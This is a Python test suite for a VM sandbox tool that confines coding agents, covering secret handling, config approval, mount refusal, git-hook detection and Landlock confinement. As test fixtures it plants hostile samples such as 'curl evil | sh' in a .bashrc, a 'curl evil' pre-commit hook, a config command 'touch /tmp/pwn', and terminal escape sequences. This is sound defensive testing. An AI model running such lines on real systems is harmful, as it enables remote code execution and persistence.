"""Host-side behaviour, against a fake smolvm. `vk selftest` covers real VMs."""

import io
import json
import os
import subprocess
import sys
import tempfile
import tarfile
import tomllib
import unittest
from contextlib import redirect_stderr
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from vankila import cli, config, confine, sandbox, seed, smol, trust  # noqa: E402
from vankila import ui  # noqa: E402
from vankila.ui import Fail  # noqa: E402


class Env(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        base = Path(self.tmp.name)
        self.home = base / "home"
        self.project = self.home / "code" / "demo"
        self.project.mkdir(parents=True)
        self.state_file = base / "fake.json"
        fake = base / "smolvm"
        fake.write_text(f"#!{sys.executable}\n" + (ROOT / "tests" / "fake_smolvm.py").read_text())
        fake.chmod(0o755)
        env = {
            "HOME": str(self.home),
            "XDG_CONFIG_HOME": str(base / "config"),
            "XDG_DATA_HOME": str(base / "data"),
            "XDG_STATE_HOME": str(base / "state"),
            "VANKILA_SMOLVM": str(fake),
            "FAKE_SMOL_STATE": str(self.state_file),
            "GH_TOKEN": "",
            "VANKILA_NO_CONFINE": "1",
        }
        patcher = mock.patch.dict(os.environ, env)
        patcher.start()
        self.addCleanup(patcher.stop)
        kvm = mock.patch("vankila.sandbox.check_kvm")
        kvm.start()
        self.addCleanup(kvm.stop)
        cwd = os.getcwd()
        os.chdir(self.project)
        self.addCleanup(os.chdir, cwd)

    def vk(self, *args):
        err = io.StringIO()
        with redirect_stderr(err):
            code = cli.main(list(args))
        self.output = err.getvalue()
        return code

    def calls(self, *prefix):
        data = json.loads(self.state_file.read_text())["calls"]
        return [c for c in data if c["argv"][: len(prefix)] == list(prefix)]

    def creates(self):
        return [c for c in self.calls("machine", "create") if "--from" in c["argv"]]

    def apply_harness(self, project, api_key=None, into=None):
        """Run the guest-side script here, on stand-ins for the guest's directories."""
        base = Path(tempfile.mkdtemp(dir=self.tmp.name))
        claude, pi = into or (base / "claude", base / "pi")
        claude.mkdir(exist_ok=True)
        pi.mkdir(exist_ok=True)
        staging = base / "staging"
        data = seed.harness_tar(project, api_key, os.getuid(), os.getgid())
        with tarfile.open(fileobj=io.BytesIO(data)) as tar:
            tar.extractall(staging, filter="data")
        payload = json.loads((staging / "payload.json").read_text())
        payload.update(claude_dir=str(claude), pi_dir=str(pi), project_root=str(project.root))
        (staging / "payload.json").write_text(json.dumps(payload))
        subprocess.run([sys.executable, "-I", str(staging / "apply_harness.py"), str(staging)], check=True)
        return claude, pi

    def write_config(self, text):
        (self.project / "vankila.toml").write_text(text)
        trust.record(config.load_project(self.project, read_project_file=False), text)


class FirstRun(Env):
    def test_zero_config_run_builds_creates_starts_execs_stops(self):
        self.assertEqual(self.vk("cargo", "test"), 0)
        self.assertTrue(self.calls("pack", "create"))
        create = self.creates()[-1]["argv"]
        self.assertIn("--from", create)
        self.assertIn("--block-private", create)
        self.assertIn("registry.npmjs.org", create)
        self.assertNotIn("example.com", create)
        exec_call = [c for c in self.calls("machine", "exec") if "cargo" in c["argv"]][0]["argv"]
        self.assertEqual(exec_call[exec_call.index("--workdir") + 1], "/workspace/demo")
        self.assertEqual(exec_call[exec_call.index("--") + 1:], ["cargo", "test"])
        self.assertTrue(self.calls("machine", "stop"))

    def test_exit_code_passes_through(self):
        self.assertEqual(self.vk("exit-seven"), 7)

    def test_subdirectory_maps_to_guest_workdir(self):
        sub = self.project / "a" / "b"
        sub.mkdir(parents=True)
        (self.project / ".git").mkdir()
        os.chdir(sub)
        self.assertEqual(self.vk("pwd"), 0)
        call = [c for c in self.calls("machine", "exec") if "pwd" in c["argv"]][0]["argv"]
        self.assertEqual(call[call.index("--workdir") + 1], "/workspace/demo/a/b")

    def test_refuses_home_directory(self):
        os.chdir(self.home)
        self.assertEqual(self.vk("pwd"), 1)
        self.assertIn("refusing to mount", self.output)


class Secrets(Env):
    def test_secret_only_in_start_env_never_in_args(self):
        from vankila.secrets import save_secret

        os.environ["ANTHROPIC_API_KEY"] = "sk-real-secret"
        save_secret("github", "ghp-real-secret")
        self.assertEqual(self.vk("true"), 0)
        data = json.loads(self.state_file.read_text())
        for call in data["calls"]:
            joined = " ".join(call["argv"])
            self.assertNotIn("real-secret", joined)
        create = self.creates()[-1]["argv"]
        self.assertIn("anthropic=ANTHROPIC_API_KEY@api.anthropic.com", create)
        self.assertIn("github=GH_TOKEN@api.github.com", create)
        self.assertIn("github-git=VANKILA_GIT_AUTH@github.com:set-header=authorization", create)
        start = self.calls("machine", "start")[-1]["secrets"]
        self.assertEqual(start["ANTHROPIC_API_KEY"], "sk-real-secret")
        self.assertTrue(start["VANKILA_GIT_AUTH"].startswith("Basic "))

    def test_mistral_binds_only_with_its_preset(self):
        os.environ["MISTRAL_API_KEY"] = "real-secret"
        self.assertEqual(self.vk("true"), 0)
        self.assertNotIn("mistral=MISTRAL_API_KEY@api.mistral.ai", self.creates()[-1]["argv"])
        self.write_config('[network]\npresets = ["mistral"]\n')
        self.assertEqual(self.vk("-y", "true"), 0)
        create = self.creates()[-1]["argv"]
        self.assertIn("mistral=MISTRAL_API_KEY@api.mistral.ai", create)
        self.assertIn("api.mistral.ai", create)

    def test_stored_secret_file_is_private(self):
        from vankila.secrets import save_secret, store_path

        save_secret("anthropic", 'sk"tricky\\value')
        self.assertEqual(store_path().stat().st_mode & 0o777, 0o600)
        with store_path().open("rb") as handle:
            self.assertEqual(tomllib.load(handle)["anthropic"], 'sk"tricky\\value')

    def test_claude_prefers_subscription_when_both_are_set(self):
        os.environ["ANTHROPIC_API_KEY"] = "a"
        os.environ["CLAUDE_CODE_OAUTH_TOKEN"] = "b"
        self.assertEqual(self.vk("claude", "--help"), 0)
        call = [c for c in self.calls("machine", "exec") if "claude" in c["argv"]][0]["argv"]
        tail = call[call.index("--") + 1:]
        self.assertEqual(tail, ["env", "-u", "ANTHROPIC_API_KEY", "claude",
                                "--dangerously-skip-permissions", "--help"])

    def test_github_token_is_not_picked_up_implicitly(self):
        os.environ["GH_TOKEN"] = "ghp-ambient"
        with mock.patch("vankila.secrets._run_command", return_value="ghp-from-gh") as gh:
            self.assertEqual(self.vk("true"), 0)
        gh.assert_not_called()
        self.assertFalse([a for a in self.creates()[-1]["argv"] if a.startswith("github=")])
        self.assertIn("vk auth github", self.output)

    def test_github_token_from_gh_needs_an_explicit_setting(self):
        self.write_config('[auth]\ngithub = "gh"\n')
        with mock.patch("vankila.secrets._run_command", return_value="ghp-from-gh"):
            self.assertEqual(self.vk("true"), 0)
        self.assertIn("github=GH_TOKEN@api.github.com", self.creates()[-1]["argv"])
        self.assertIn("gh auth token", self.output)

    def test_doctor_does_not_fail_for_a_missing_github_token(self):
        from vankila.secrets import save_secret

        save_secret("anthropic", "x")
        with mock.patch("vankila.cli.check_kvm"):
            self.assertEqual(self.vk("build"), 0)
            self.assertEqual(self.vk("doctor"), 0)

    def test_claude_first_run_prompts_are_preseeded(self):
        os.environ["ANTHROPIC_API_KEY"] = "a"
        self.assertEqual(self.vk("true"), 0)
        claude, _ = self.apply_harness(config.load_project(self.project), "SMOL_PLACEHOLDER_abcdefghijklmnopqrstuvwxyz")
        state = json.loads((claude / ".claude.json").read_text())
        self.assertTrue(state["hasCompletedOnboarding"])
        self.assertTrue(state["projects"]["/workspace/demo"]["hasTrustDialogAccepted"])
        self.assertEqual(state["customApiKeyResponses"]["approved"], ["ghijklmnopqrstuvwxyz"])


class Trust(Env):
    def tty(self, answer):
        return (mock.patch("sys.stdin.isatty", return_value=True),
                mock.patch("builtins.input", side_effect=answer))

    def test_load_uses_the_bytes_that_were_checked(self):
        good = '[network]\npresets = ["npm"]\n'
        self.write_config(good)
        real_read = trust.read_project_file

        def swap_after_read(root):
            text = real_read(root)
            (root / "vankila.toml").write_text('[network]\npresets = ["claude"]\n')
            return text

        with mock.patch("vankila.trust.read_project_file", swap_after_read):
            project = trust.load_approved(self.project)
        self.assertEqual(project.config["network"]["presets"], ["npm"])

    def test_approval_records_what_was_shown_not_what_is_on_disk_now(self):
        shown = "[network]\nallow = []\n"
        (self.project / "vankila.toml").write_text(shown)
        evil = '[credentials.x]\nenv="X"\nhosts=["e.example.com"]\ncommand="touch /tmp/pwn"\n'

        def answer_while_guest_edits(_prompt):
            (self.project / "vankila.toml").write_text(evil)
            return "y"

        isatty, _ = self.tty([])
        with isatty, mock.patch("builtins.input", answer_while_guest_edits), redirect_stderr(io.StringIO()):
            project = trust.load_approved(self.project)
        self.assertEqual(project.config["credentials"], {})
        self.assertEqual(trust.approved_text(project), shown)
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("needs approval", self.output)

    def test_deleted_config_is_a_change_without_a_tty(self):
        self.write_config('[network]\npresets = ["npm"]\n')
        self.assertEqual(self.vk("true"), 0)
        calls = len(self.calls("machine", "update"))
        (self.project / "vankila.toml").unlink()
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("deleted", self.output)
        self.assertEqual(len(self.calls("machine", "update")), calls)

    def test_declining_a_deletion_stops_and_accepting_clears_it(self):
        self.write_config('[network]\npresets = ["npm"]\n')
        (self.project / "vankila.toml").unlink()
        isatty, answer = self.tty(["n"])
        with isatty, answer:
            self.assertEqual(self.vk("true"), 1)
        self.assertFalse(self.state_file.exists())
        isatty, answer = self.tty(["y"])
        with isatty, answer:
            self.assertEqual(self.vk("true"), 0)
        self.assertEqual(self.vk("true"), 0)

    def test_deleting_a_config_can_not_silently_move_the_root_up(self):
        (self.project / ".git").mkdir()
        sub = self.project / "sub"
        sub.mkdir()
        os.chdir(sub)
        text = '[network]\npresets = ["npm"]\n'
        (sub / "vankila.toml").write_text(text)
        trust.record(config.load_project(sub, read_project_file=False), text)
        (sub / "vankila.toml").unlink()
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("deleted", self.output)

    def test_prompt_shows_escape_sequences_harmlessly(self):
        (self.project / "vankila.toml").write_text('# \x1b]52;c;aGk=\x07\n')
        isatty, answer = self.tty(["n"])
        with isatty, answer:
            self.assertEqual(self.vk("true"), 1)
        self.assertNotIn("\x1b", self.output)
        self.assertIn("\\x1b", self.output)

    def test_allow_refuses_a_guest_edit_after_the_check(self):
        self.write_config("[network]\nallow = []\n")
        project = trust.load_approved(self.project)
        (self.project / "vankila.toml").write_text('[credentials.x]\nenv="X"\nhosts=["e.example.com"]\n')
        with redirect_stderr(io.StringIO()), self.assertRaisesRegex(Fail, "changed"):
            cli.cmd_allow(project, ["api.stripe.com"], False)
        self.assertNotIn("credentials", trust.approved_text(project))

    def test_allow_failure_leaves_the_file_alone(self):
        text = "[network]\nallow = []\n"
        self.write_config(text)
        self.assertEqual(self.vk("allow", "not a host"), 1)
        self.assertEqual((self.project / "vankila.toml").read_text(), text)

    def test_init_does_not_write_through_a_dangling_symlink(self):
        victim = self.home / "victim"
        (self.project / "vankila.toml").symlink_to(victim)
        self.assertEqual(self.vk("init"), 0)
        self.assertFalse(victim.exists())

    def test_unapproved_config_is_refused_without_a_tty(self):
        (self.project / "vankila.toml").write_text('[sandbox]\nmounts = ["~/.ssh:/x"]\n')
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("needs approval", self.output)
        self.assertFalse(self.state_file.exists())

    def test_guest_edit_invalidates_approval(self):
        self.write_config("[network]\nallow = []\n")
        self.assertEqual(self.vk("true"), 0)
        (self.project / "vankila.toml").write_text('[credentials.x]\nenv="X"\nhosts=["evil.example.com"]\ncommand="touch /tmp/pwn"\n')
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("needs approval", self.output)

    def test_symlinked_config_is_refused(self):
        target = self.home / "secret"
        target.write_text("x")
        (self.project / "vankila.toml").symlink_to(target)
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("not a regular file", self.output)

    def test_allow_records_approval_and_keeps_comments(self):
        self.write_config('# my comment\n[network]\nallow = []  # keep\n')
        self.assertEqual(self.vk("allow", "api.stripe.com"), 0)
        text = (self.project / "vankila.toml").read_text()
        self.assertIn("# my comment", text)
        self.assertIn('allow = ["api.stripe.com"]', text)
        self.assertEqual(self.vk("allow", "*.example.com"), 0)
        self.assertIn('"api.stripe.com", "*.example.com"', (self.project / "vankila.toml").read_text())
        self.assertEqual(self.vk("true"), 0)

    def test_allow_rejects_garbage_host(self):
        self.write_config("[network]\nallow = []\n")
        self.assertEqual(self.vk("allow", "not a host"), 1)


class GlobalAllow(Env):
    def test_global_allow_is_added_to_a_project_allow_list(self):
        path = config.config_home() / "config.toml"
        path.parent.mkdir(parents=True)
        path.write_text('[network]\nallow = ["releases.astral.sh"]\n')
        self.write_config('[network]\nallow = ["api.stripe.com"]\n')
        hosts = config.load_project(self.project).allowed_hosts()
        self.assertIn("releases.astral.sh", hosts)
        self.assertIn("api.stripe.com", hosts)
        self.write_config("[network]\nallow = []\n")
        self.assertIn("releases.astral.sh", config.load_project(self.project).allowed_hosts())


class Drift(Env):
    def test_allowlist_change_updates_in_place(self):
        self.write_config("[network]\nallow = []\n")
        self.assertEqual(self.vk("true"), 0)
        self.assertEqual(self.vk("allow", "api.stripe.com"), 0)
        self.assertEqual(self.vk("true"), 0)
        self.assertEqual(len(self.creates()), 1)
        update = self.calls("machine", "update")[-1]["argv"]
        self.assertIn("--reset-allow-list", update)
        self.assertIn("api.stripe.com", update)

    def test_structural_change_needs_a_new_machine(self):
        self.write_config("[sandbox]\ncpus = 2\n")
        self.assertEqual(self.vk("true"), 0)
        self.write_config("[sandbox]\ncpus = 8\n")
        self.assertEqual(self.vk("-y", "true"), 0)
        self.assertEqual(len(self.creates()), 2)
        self.assertTrue(self.calls("machine", "delete"))


class GuestStateIsUntrusted(Env):
    def setUp(self):
        super().setUp()
        self.victim = Path(self.tmp.name) / "victim"
        self.victim.write_text("original")

    def state_tree(self, project):
        out = {}
        for directory, subdirs, names in os.walk(project.state_dir / "pi"):
            for name in subdirs + names:
                path = Path(directory) / name
                out[str(path)] = os.readlink(path) if path.is_symlink() else path.is_dir()
        return out

    def test_vk_does_not_write_through_a_planted_pi_symlink(self):
        """The audit's V1: a guest symlink must not redirect a host-side write."""
        self.write_config('[harness.pi]\nsettings = { defaultProvider = "x" }\n')
        overlay = self.project / ".vankila" / "harness" / "pi"
        overlay.mkdir(parents=True)
        (overlay / ".bashrc").write_text("curl evil | sh\n")
        self.assertEqual(self.vk("true"), 0)
        project = config.load_project(self.project)
        outside = self.home / "outside"
        outside.mkdir()
        (project.state_dir / "pi").mkdir(exist_ok=True)
        (project.state_dir / "pi" / "agent").symlink_to(outside)
        before = self.state_tree(project)
        self.assertEqual(self.vk("true"), 0)
        self.assertEqual(list(outside.iterdir()), [])
        self.assertEqual(self.state_tree(project), before)

    def test_vk_does_not_read_a_planted_project_overlay_on_the_host(self):
        overlay = self.project / ".vankila" / "harness" / "claude"
        overlay.mkdir(parents=True)
        (overlay / "stolen").symlink_to(self.victim)
        project = config.load_project(self.project)
        data = seed.harness_tar(project, None, os.getuid(), os.getgid())
        self.assertNotIn(b"original", data)

    def test_harness_is_delivered_to_a_running_vm_too(self):
        self.write_config("[sandbox]\nkeep_running = true\n")
        self.assertEqual(self.vk("true"), 0)
        self.assertEqual(self.vk("true"), 0)
        delivered = [c for c in self.calls("machine", "exec") if seed.APPLY_HARNESS_COMMAND in c["argv"]]
        self.assertEqual(len(delivered), 2)
        starts = [c for c in self.calls("machine", "start") if "vankila-bake" not in " ".join(c["argv"])]
        self.assertEqual(len(starts), 1)

    def test_guest_script_copies_overlays_but_not_symlinks(self):
        overlay = self.project / ".vankila" / "harness" / "claude"
        (overlay / "skills").mkdir(parents=True)
        (overlay / "CLAUDE.md").write_text("project")
        (overlay / "skills" / "a.md").write_text("skill")
        (overlay / "stolen").symlink_to(self.victim)
        global_overlay = config.config_home() / "harness" / "claude"
        global_overlay.mkdir(parents=True)
        (global_overlay / "CLAUDE.md").write_text("global")
        (global_overlay / "GLOBAL.md").write_text("global")
        claude, _ = self.apply_harness(config.load_project(self.project))
        self.assertEqual((claude / "CLAUDE.md").read_text(), "project")
        self.assertEqual((claude / "GLOBAL.md").read_text(), "global")
        self.assertEqual((claude / "skills" / "a.md").read_text(), "skill")
        self.assertFalse(os.path.lexists(claude / "stolen"))

    def test_guest_script_handles_a_dangling_planted_link(self):
        project = config.load_project(self.project)
        claude, pi = self.apply_harness(project)
        target = Path(self.tmp.name) / "not-yet"
        (pi / "agent").rmdir()
        (pi / "agent").symlink_to(target)
        self.apply_harness(project, into=(claude, pi))
        self.assertTrue(target.is_dir())

    def test_guest_script_merges_settings_and_survives_garbage(self):
        self.write_config('[harness.pi]\nsettings = { defaultProvider = "x" }\n')
        project = config.load_project(self.project)
        claude, pi = self.apply_harness(project)
        (claude / "settings.json").write_text('{"mine": 1, "env": {"KEEP": "1"}}')
        (pi / "agent" / "settings.json").write_text("{nope")
        (claude / ".claude.json").write_text("[1]")
        self.apply_harness(project, into=(claude, pi))
        settings = json.loads((claude / "settings.json").read_text())
        self.assertEqual(settings["mine"], 1)
        self.assertEqual(settings["env"]["KEEP"], "1")
        self.assertEqual(settings["env"]["DISABLE_AUTOUPDATER"], "1")
        self.assertEqual(json.loads((pi / "agent" / "settings.json").read_text()), {"defaultProvider": "x"})
        self.assertTrue(json.loads((claude / ".claude.json").read_text())["hasCompletedOnboarding"])

    def test_git_hook_written_by_guest_is_reported(self):
        hooks = self.project / ".git" / "hooks"
        hooks.mkdir(parents=True)
        before = sandbox.git_fingerprint(self.project)
        (hooks / "pre-commit").write_text("#!/bin/sh\ncurl evil\n")
        err = io.StringIO()
        with redirect_stderr(err):
            sandbox.report_git_changes(self.project, before)
        self.assertIn(".git/hooks/pre-commit", err.getvalue())


class Mounts(Env):
    def refused(self, path):
        with self.assertRaisesRegex(Fail, "refusing to mount"):
            config.check_mountable(Path(path).resolve())

    def test_sensitive_paths_are_refused(self):
        for name in (".ssh", ".ssh/keys", ".config", ".config/vankila", ".local", ".local/state", ".bashrc"):
            self.refused(self.home / name)
        for path in ("/etc", "/etc/ssl", "/usr", "/root", "/proc/self"):
            self.refused(path)
        self.refused(config.state_home())

    def test_parents_of_sensitive_paths_are_refused(self):
        self.refused(config.state_home().parent)

    def test_ordinary_paths_are_allowed(self):
        config.check_mountable(self.project.resolve())
        config.check_mountable((self.home / ".cache" / "vk-selftest").resolve())

    def test_sensitive_mount_is_refused_in_config(self):
        self.write_config('[sandbox]\nmounts = ["~/.ssh:/x"]\n')
        self.assertEqual(self.vk("true"), 1)
        self.assertIn("refusing to mount", self.output)

    def test_mount_swapped_for_a_symlink_is_refused_even_with_yes(self):
        lib = self.project / "lib"
        lib.mkdir()
        self.write_config('[sandbox]\nmounts = ["./lib:/x"]\n')
        self.assertEqual(self.vk("true"), 0)
        lib.rmdir()
        other = self.home / "other"
        other.mkdir()
        lib.symlink_to(other)
        self.assertEqual(self.vk("-y", "true"), 1)
        self.assertIn("symlink inside the project", self.output)
        self.assertEqual(len(self.creates()), 1)

    def test_recreate_shows_what_changed(self):
        self.write_config("[sandbox]\ncpus = 2\n")
        self.assertEqual(self.vk("true"), 0)
        self.write_config("[sandbox]\ncpus = 8\n")
        self.assertEqual(self.vk("-y", "true"), 0)
        self.assertIn("cpus: 2 -> 8", self.output)


class GitFingerprint(Env):
    def test_worktree_hooks_and_pointer_are_covered(self):
        main = self.home / "main.git"
        (main / "worktrees" / "demo").mkdir(parents=True)
        (main / "hooks").mkdir()
        (main / "worktrees" / "demo" / "commondir").write_text("../..\n")
        (self.project / ".git").write_text(f"gitdir: {main}/worktrees/demo\n")
        before = sandbox.git_fingerprint(self.project)
        self.assertIn(".git", before)
        (main / "hooks" / "pre-commit").write_text("evil")
        after = sandbox.git_fingerprint(self.project)
        self.assertTrue(any(key.endswith("pre-commit") for key in after))

    def test_submodule_hooks_are_covered(self):
        module = self.project / ".git" / "modules" / "lib"
        (module / "hooks").mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "hooks" / "post-checkout").write_text("evil")
        self.assertIn(".git/modules/lib/hooks/post-checkout", sandbox.git_fingerprint(self.project))

    def test_symlinks_are_recorded_not_followed(self):
        (self.project / ".git").mkdir()
        outside = self.home / "outside"
        outside.mkdir()
        (outside / "hook").write_text("x")
        (self.project / ".git" / "hooks").symlink_to(outside)
        prints = sandbox.git_fingerprint(self.project)
        self.assertEqual(prints[".git/hooks"], f"symlink:{outside}")
        self.assertFalse([key for key in prints if key.endswith("hook")])

    def test_a_fifo_does_not_hang(self):
        hooks = self.project / ".git" / "hooks"
        hooks.mkdir(parents=True)
        os.mkfifo(hooks / "pre-commit")
        self.assertEqual(sandbox.git_fingerprint(self.project)[".git/hooks/pre-commit"], "not-a-file")

    def test_change_between_sessions_is_reported_with_keep_running(self):
        hooks = self.project / ".git" / "hooks"
        hooks.mkdir(parents=True)
        self.write_config("[sandbox]\nkeep_running = true\n")
        self.assertEqual(self.vk("true"), 0)
        (hooks / "pre-commit").write_text("written while no session was open")
        self.assertEqual(self.vk("true"), 0)
        self.assertIn(".git/hooks/pre-commit", self.output)
        self.assertEqual(self.vk("true"), 0)
        self.assertNotIn(".git/hooks/pre-commit", self.output)

    def test_hook_name_is_printed_safely(self):
        hooks = self.project / ".git" / "hooks"
        hooks.mkdir(parents=True)
        before = sandbox.git_fingerprint(self.project)
        (hooks / "a\x1b]52;c;aGk=\x07").write_text("x")
        err = io.StringIO()
        with redirect_stderr(err):
            sandbox.report_git_changes(self.project, before)
        self.assertNotIn("\x1b", err.getvalue())


class SafetyNets(Env):
    def test_snapshot_copies_without_following_symlinks_and_is_pruned(self):
        secret = self.home / "secret"
        secret.write_text("host secret")
        (self.project / "work").write_text("v1")
        (self.project / "link").symlink_to(secret)
        self.write_config("[sandbox]\nsnapshot = true\n")
        for _ in range(sandbox.SNAPSHOTS_KEPT + 1):
            self.assertEqual(self.vk("true"), 0)
        snapshots = sorted((config.load_project(self.project).state_dir / "snapshots").iterdir())
        self.assertEqual(len(snapshots), sandbox.SNAPSHOTS_KEPT)
        self.assertEqual((snapshots[-1] / "work").read_text(), "v1")
        self.assertTrue((snapshots[-1] / "link").is_symlink())

    def test_no_snapshot_while_the_vm_is_running(self):
        self.write_config("[sandbox]\nsnapshot = true\nkeep_running = true\n")
        self.assertEqual(self.vk("true"), 0)
        self.assertEqual(self.vk("true"), 0)
        snapshots = list((config.load_project(self.project).state_dir / "snapshots").iterdir())
        self.assertEqual(len(snapshots), 1)

    def test_low_disk_warns(self):
        usage = mock.Mock(free=1024)
        err = io.StringIO()
        with mock.patch("shutil.disk_usage", return_value=usage), redirect_stderr(err):
            sandbox.report_low_disk(self.project)
        self.assertIn("left on the disk", err.getvalue())


class SafePrinting(Env):
    DENIAL = "evil\x1b]52;c;aGk=\x07.example.com:443"

    def test_denials_are_printed_safely(self):
        data = {"machines": {}, "calls": [], "denials": [{"dest": self.DENIAL, "operation": "tcp"}]}
        self.state_file.write_text(json.dumps(data))
        self.assertEqual(self.vk("blocked"), 0)
        self.assertNotIn("\x1b", self.output)
        err = io.StringIO()
        with redirect_stderr(err):
            sandbox.report_denials(smol.Smol(), config.load_project(self.project), datetime(2000, 1, 1, tzinfo=timezone.utc))
        self.assertNotIn("\x1b", err.getvalue())
        self.assertNotIn("vk allow", err.getvalue())

    def test_clean_escapes_bidi_and_keeps_text(self):
        self.assertEqual(ui.clean("a\u202eb\tc é"), "a\\u202eb\tc é")


@unittest.skipUnless(confine.abi_version() >= 1, "needs Landlock")
class Confinement(Env):
    def probe(self, code, read_only=(), read_write=()):
        spec = {"read_only": ["/usr", "/lib", "/lib64", "/etc", *read_only], "read_write": list(read_write)}
        return subprocess.run(
            confine.wrapper_command(spec, [sys.executable, "-I", "-c", code]),
            capture_output=True, text=True, check=False,
        )

    def test_blocks_what_was_not_granted_and_allows_what_was(self):
        secret = self.home / "secret"
        secret.write_text("x")
        allowed = self.home / "allowed"
        allowed.mkdir()
        denied = self.probe(f"open({str(secret)!r}).read()")
        self.assertNotEqual(denied.returncode, 0)
        self.assertIn("PermissionError", denied.stderr)
        written = self.probe(f"open({str(allowed / 'f')!r}, 'w').write('ok')", read_write=[str(allowed)])
        self.assertEqual(written.returncode, 0, written.stderr)

    def test_read_only_path_can_not_be_written(self):
        allowed = self.home / "ro"
        allowed.mkdir()
        result = self.probe(f"open({str(allowed / 'f')!r}, 'w')", read_only=[str(allowed)])
        self.assertIn("PermissionError", result.stderr)

    def test_can_not_read_another_process_environment(self):
        result = self.probe(f"open('/proc/{os.getpid()}/environ').read()", read_only=["/proc"])
        self.assertNotEqual(result.returncode, 0)

    def test_start_uses_the_wrapper_and_keeps_secrets_out_of_argv(self):
        del os.environ["VANKILA_NO_CONFINE"]
        client = smol.Smol("/bin/true")
        with mock.patch("subprocess.run", return_value=mock.Mock(returncode=0)) as run:
            client.start("vm", {"TOKEN": "real-secret"}, ["/rw"], ["/ro"])
        argv, kwargs = run.call_args[0][0], run.call_args[1]
        self.assertIn("confine.py", argv[2])
        self.assertNotIn("real-secret", " ".join(argv))
        self.assertEqual(kwargs["env"]["TOKEN"], "real-secret")

    def test_no_landlock_warns_and_still_starts(self):
        del os.environ["VANKILA_NO_CONFINE"]
        client = smol.Smol("/bin/true")
        err = io.StringIO()
        with mock.patch("vankila.confine.abi_version", return_value=0), redirect_stderr(err):
            client.start("vm", {}, [], [])
        self.assertIn("not confined", err.getvalue())


class SmolvmInstall(Env):
    def setUp(self):
        super().setUp()
        del os.environ["VANKILA_SMOLVM"]
        self.bin = Path(self.tmp.name) / "bin"
        self.bin.mkdir()
        os.environ["PATH"] = str(self.bin)

    def fake_download(self, content):
        def retrieve(url, path):
            Path(path).write_bytes(content)

        return mock.patch("urllib.request.urlretrieve", retrieve)

    def test_path_copy_wins_over_a_downloaded_one(self):
        marker = smol._install_marker()
        marker.parent.mkdir(parents=True)
        marker.touch()
        self.assertEqual(smol.find_binary(), str(smol._managed_binary()))
        on_path = self.bin / "smolvm"
        on_path.write_text("#!/bin/sh\n")
        on_path.chmod(0o755)
        self.assertEqual(smol.find_binary(), str(on_path))
        os.environ["VANKILA_SMOLVM"] = "/custom/smolvm"
        self.assertEqual(smol.find_binary(), "/custom/smolvm")

    def test_no_terminal_means_no_download(self):
        with mock.patch("sys.stdin.isatty", return_value=False), \
             mock.patch("urllib.request.urlretrieve") as retrieve:
            with self.assertRaisesRegex(Fail, "unattended"):
                smol.require_binary()
        retrieve.assert_not_called()

    def test_declining_or_just_pressing_enter_means_no_download(self):
        err = io.StringIO()
        with mock.patch("sys.stdin.isatty", return_value=True), \
             mock.patch("builtins.input", return_value=""), \
             mock.patch("urllib.request.urlretrieve") as retrieve, redirect_stderr(err):
            with self.assertRaises(Fail):
                smol.require_binary()
        retrieve.assert_not_called()
        self.assertIn(smol._asset_url(), err.getvalue())
        self.assertIn(smol.SMOLVM_SHA256[smol._arch()], err.getvalue())

    def test_archive_not_matching_the_pin_is_rejected(self):
        with self.fake_download(b"tampered"), redirect_stderr(io.StringIO()):
            with self.assertRaisesRegex(Fail, "pinned"):
                smol.install()
        self.assertIsNone(smol.find_binary())
        self.assertFalse(smol._managed_binary().exists())

    def test_install_makes_no_other_network_request(self):
        with self.fake_download(b"tampered"), redirect_stderr(io.StringIO()), \
             mock.patch("urllib.request.urlopen") as urlopen:
            with self.assertRaises(Fail):
                smol.install()
        urlopen.assert_not_called()


class Rendering(unittest.TestCase):
    def test_cooldown_units_are_right_for_each_tool(self):
        files = seed.registry_files({"cooldown_days": 14, "ignore_scripts": True})
        self.assertIn("min-release-age=14\n", files["/usr/local/etc/npmrc"])
        self.assertIn("ignore-scripts=true", files["/usr/local/etc/npmrc"])
        self.assertIn("minimumReleaseAge: 20160", files["/home/agent/.config/pnpm/config.yaml"])
        self.assertIn('npmMinimalAgeGate: "14d"', files["/home/agent/.yarnrc.yml"])
        self.assertEqual(tomllib.loads(files["/home/agent/.bunfig.toml"])["install"]["minimumReleaseAge"], 1209600)
        self.assertEqual(tomllib.loads(files["/etc/uv/uv.toml"])["exclude-newer"], "14 days")
        self.assertIn("uploaded-prior-to = P14D", files["/etc/pip.conf"])
        tomllib.loads(files["/home/agent/.cargo/config.toml"])

    def test_cooldown_zero_disables_it(self):
        files = seed.registry_files({"cooldown_days": 0, "ignore_scripts": False})
        self.assertNotIn("min-release-age", files["/usr/local/etc/npmrc"])
        self.assertNotIn("/etc/uv/uv.toml", files)

    def test_template_parses_and_detects_presets(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "Cargo.toml").write_text("")
            data = tomllib.loads(config.render_template(root))
            self.assertIn("crates", data["network"]["presets"])
            self.assertNotIn("npm", data["network"]["presets"])

    def test_provision_script_is_valid_bash(self):
        script = ROOT / "src" / "vankila" / "assets" / "provision.sh"
        subprocess.run(["bash", "-n", str(script)], check=True)

    def test_unknown_config_key_is_a_clear_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "vankila.toml"
            path.write_text("[sandbox]\ncpu = 2\n")
            with self.assertRaisesRegex(Fail, "sandbox.cpu"):
                config._load(path)


if __name__ == "__main__":
    unittest.main()
